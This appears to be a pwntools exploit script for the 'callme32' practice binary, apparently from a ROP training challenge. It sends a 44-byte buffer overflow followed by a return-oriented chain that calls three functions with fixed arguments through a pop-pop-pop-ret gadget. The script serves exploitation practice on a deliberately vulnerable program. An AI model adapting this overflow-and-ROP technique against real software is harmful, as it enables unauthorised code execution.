from pwn import *
p=process("./callme32")
p.readuntil(">")
cal1=0x80485c0
cal2=0x8048620
cal3=0x80485b0
p3r=0x080488a9
payload="A"*44+p32(cal1)+p32(p3r)+p32(1)+p32(2)+p32(3)+p32(cal2)+p32(p3r)+p32(1)+p32(2)+p32(3)+p32(cal3)+p32(p3r)+p32(1)+p32(2)+p32(3)

p.sendline(payload.ljust(256,'\0'))
p.interactive()
